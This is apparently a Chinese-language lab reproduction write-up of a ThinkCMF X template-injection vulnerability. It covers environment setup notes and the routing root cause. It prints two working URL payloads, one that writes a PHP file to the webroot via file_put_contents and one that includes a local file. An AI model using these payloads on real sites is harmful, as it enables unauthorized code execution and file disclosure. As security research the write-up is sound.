本文参考自：  
https://xz.aliyun.com/t/6626

0x00  
由于原文写的已经比较详细，故本文只记录我在复现分析的过程中碰到的问题及学到的知识

0x01  
搭建环境时，稳妥起见选择和原文一致的php版本  
这里注意：php安装包中，ts版本指的是线程安全版本，通常用在ISAPI模式中，而nts版本指的是非线程安全版本，通常用在fastcgi模式中  
ISAPI模式：php作为一个模块，比如作为apache的一个模块  
fastcgi模式：cgi模式的升级版，当作为一个独立的进程存在时，php-fpm是fastcgi的一种实现  
windows下：  
apache+php->ts  
iis(fastcgi)+php->nts（php5.3起搭配fastcgi为主）  
iis(ISAPI)+php->nts（php5.3以前搭配ISAPI为主）  
linux下：  
apache+php->ts  
nginx+php->nts  

0x02  
搭建环境时，第三步报错，提示“thinkcmf 安装报错 Driver.class.php 　LINE: 350”，drop database thinkcmf后，重新安装成功，原因未知

0x03  
由于我个人喜欢在不同的虚拟机下进行攻击测试（这样更贴近实战），当在虚拟机kali下访问时无反映，提示“just a demo for multi lang user! LANG IS en-us;”，后经测试发现是因为thinkcmf不能在英文系统下访问，改用虚拟机win10攻击机（中文版）访问，成功访问

0x04  
使用firefox下插件HackBar Quantum，执行payload1  
```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
```
成功在C:\phpstudy_pro\WWW\ThinkCMFX\下创建test.php，访问http://172.16.35.132/ThinkCMFX/test.php 能够成功访问

0x05  
使用firefox下插件HackBar Quantum，执行payload2  
```
?a=display&templateFile=README.md
```
成功包含了README.md

0x06  
漏洞形成的根本原因，ThinkPHP框架规则中，可以通过g\m\a参数指定分组\模块\方法（这里的分组即应用，也就是可以通过g\m\a参数指定任意应用的模块、方法）  
应用是thinkcmf中的概念，一个blog即一个应用，一个商场即一个应用，具体参见thinkcmf官方文档：https://www.thinkcmf.com/docs/cmfx/app.html
